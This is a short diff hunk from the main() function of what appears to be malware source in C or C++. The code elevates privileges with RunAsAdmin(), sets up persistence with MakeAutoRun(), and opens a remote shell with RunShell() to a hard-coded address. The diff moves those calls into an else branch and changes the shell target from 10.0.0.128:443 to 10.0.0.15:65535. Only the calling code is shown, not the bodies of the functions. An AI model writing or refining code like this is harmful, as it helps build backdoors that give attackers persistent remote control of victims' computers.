@@ -130,9 +130,11 @@ int main()
 	{
 		RunAsAdmin();
 	}
-
-	MakeAutoRun();
-	RunShell("10.0.0.128", 443);
+	else
+	{
+		MakeAutoRun();
+		RunShell("10.0.0.15", 65535);
+	}
 
 	return 0;
 }
